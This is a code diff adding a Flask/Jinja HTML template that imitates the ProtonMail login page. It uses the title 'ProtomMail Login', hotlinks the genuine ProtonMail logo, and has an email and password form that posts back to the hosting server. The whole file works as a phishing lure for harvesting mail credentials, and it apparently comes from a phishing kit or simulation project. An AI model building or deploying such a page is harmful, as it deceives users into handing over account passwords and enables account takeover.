@@ -1,0 +1,32 @@
+{% block head%}
+<head>
+    <meta charset='utf-8'>
+    <title>ProtomMail Login</title>
+    <meta name='viewport' content='width=device-width, initial-scale=1'>
+    <link rel="stylesheet" href="{{ url_for('static', filename='../../static/protonmail/main.css') }}">
+
+</head>
+{% endblock %}
+
+{% block body %} 
+<div class="login-bg">
+    <div class="panel">    
+      <div class="logo">
+        <img src="https://mail.protonmail.com/assets/img/logo.png"/>
+      </div>
+      <div class="panel-inner">
+        <form action="/" method="POST">
+            <label> Email Address </label>
+            <input class="mar-b-20" type="email" placeholder="name@company.com" name="username" required/>
+            <label> Password </label>
+            <input class="mar-b-40" type="password" placeholder="password" name="password" required/>
+            <button type="submit">login</button>
+            </form>
+        <div class="options">
+          <span>Don't have an account?</span>
+          <span>Get started</span>
+        </div>
+      </div>
+    </div>
+  </div>
+{% endblock %}
